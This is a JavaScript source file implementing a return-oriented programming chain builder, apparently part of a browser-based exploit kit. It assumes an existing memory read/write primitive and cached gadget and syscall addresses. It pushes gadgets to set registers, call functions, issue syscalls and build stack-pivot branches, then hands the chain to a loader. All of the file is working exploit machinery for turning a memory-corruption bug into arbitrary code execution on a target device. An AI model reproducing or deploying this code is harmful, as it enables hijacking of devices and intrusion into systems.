const stack_sz = 0x40000;
const reserve_upper_stack = 0x8000;
const stack_reserved_idx = reserve_upper_stack / 4;


window.rop = function () {
  var cachedGadgets = window.gadgets;
  var cachedSyscalls = window.syscalls;
  
  this.stackback = p.malloc32(stack_sz / 4);
  this.stack = this.stackback.add32(reserve_upper_stack);
  this.stack_array = this.stackback.backing;
  this.retval = this.stack.add32(0x3FFF8);
  this.count = 1;
  this.branches_count = 0;
  this.branches_rsps = p.malloc(0x200);
  this.useless_buffer = p.malloc(8);

  this.clear = function () {
    this.count = 1;
    this.branches_count = 0;

    var startIdx = 1 + stack_reserved_idx;
    var endIdx = (stack_sz / 4);
    var stackArray = this.stack_array;
    
    for (var i = startIdx; i < endIdx; i++) {
      stackArray[i] = 0;
    }
  };

  this.pushSymbolic = function () {
    this.count++;
    return this.count - 1;
  }

  this.finalizeSymbolic = function (idx, val) {
    if (val instanceof int64) {
      this.stack_array[stack_reserved_idx + idx * 2] = val.low;
      this.stack_array[stack_reserved_idx + idx * 2 + 1] = val.hi;
    } else {
      this.stack_array[stack_reserved_idx + idx * 2] = val;
      this.stack_array[stack_reserved_idx + idx * 2 + 1] = 0;
    }
  }

  this.push = function (val) {
    this.finalizeSymbolic(this.pushSymbolic(), val);
  }

  this.push_write8 = function (where, what) {
    this.push(cachedGadgets["pop rdi"]);
    this.push(where);
    this.push(cachedGadgets["pop rsi"]);
    this.push(what);
    this.push(cachedGadgets["mov [rdi], rsi"]);
  }

  var setupRegisters = function (self, rdi, rsi, rdx, rcx, r8, r9) {
    var registerMap = [
      {param: rdi, gadget: "pop rdi"},
      {param: rsi, gadget: "pop rsi"},
      {param: rdx, gadget: "pop rdx"},
      {param: rcx, gadget: "pop rcx"},
      {param: r8, gadget: "pop r8"},
      {param: r9, gadget: "pop r9"}
    ];
    
    for (var i = 0; i < registerMap.length; i++) {
      var reg = registerMap[i];
      if (reg.param !== undefined) {
        self.push(cachedGadgets[reg.gadget]);
        self.push(reg.param);
      }
    }
  };

  this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
    setupRegisters(this, rdi, rsi, rdx, rcx, r8, r9);
    this.push(rip);
    return this;
  }

  this.get_rsp = function () {
    return this.stack.add32(this.count * 8);
  }
  this.write_result = function (where) {
    this.push(cachedGadgets["pop rdi"]);
    this.push(where);
    this.push(cachedGadgets["mov [rdi], rax"]);
  }

  this.syscall_fix = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
    setupRegisters(this, rdi, rsi, rdx, rcx, r8, r9);
    
    var sysc_restore = this.get_rsp();
    var syscallAddr = cachedSyscalls[sysc];
    this.push(syscallAddr);
    this.push(cachedGadgets["pop rdi"]);
    this.push(sysc_restore);
    this.push(cachedGadgets["pop rsi"]);
    this.push(syscallAddr);
    this.push(cachedGadgets["mov [rdi], rsi"]);
  }
  this.jmp_rsp = function (rsp) {
    this.push(cachedGadgets["pop rsp"]);
    this.push(rsp);
  }

  var createBranch = function (self, value_addr, compare_value, setConditionGadget) {
    var branch_addr_spc = self.branches_rsps.add32(self.branches_count * 0x10);
    self.branches_count++;

    self.push(cachedGadgets["pop rax"]);
    self.push(0);
    self.push(cachedGadgets["pop rcx"]);
    self.push(value_addr);
    self.push(cachedGadgets["pop rdi"]);
    self.push(compare_value);
    self.push(cachedGadgets["cmp [rcx], edi"]);
    self.push(cachedGadgets[setConditionGadget]);
    self.push(cachedGadgets["shl rax, 3"]);
    self.push(cachedGadgets["pop rdx"]);
    self.push(branch_addr_spc);
    self.push(cachedGadgets["add rax, rdx"]);
    self.push(cachedGadgets["mov rax, [rax]"]);
    self.push(cachedGadgets["pop rdi"]);
    var a = self.pushSymbolic();
    self.push(cachedGadgets["mov [rdi], rax"]);
    self.push(cachedGadgets["pop rsp"]);
    var b = self.get_rsp();
    self.push(0x41414141);

    self.finalizeSymbolic(a, b);
    return branch_addr_spc;
  };

  this.create_equal_branch = function (value_addr, compare_value) {
    return createBranch(this, value_addr, compare_value, "setne al");
  }
  this.create_greater_branch = function (value_addr, compare_value) {
    return createBranch(this, value_addr, compare_value, "setle al");
  }
  
  this.create_greater_or_equal_branch = function (value_addr, compare_value) {
    return createBranch(this, value_addr, compare_value, "setl al");
  }
  
  this.create_lesser_branch = function (value_addr, compare_value) {
    return createBranch(this, value_addr, compare_value, "setge al");
  }
  
  this.create_lesser_or_equal_branch = function (value_addr, compare_value) {
    return createBranch(this, value_addr, compare_value, "setg al");
  }

  this.set_branch_points = function (branch_addr_sp, rsp_condition_met, rsp_condition_not_met) {
    p.write8(branch_addr_sp.add32(0x0), rsp_condition_met);
    p.write8(branch_addr_sp.add32(0x8), rsp_condition_not_met);
  }

  this.run = function () {
    var retv = p.loadchain(this);
    this.clear();
    return retv;
  }

  return this;
};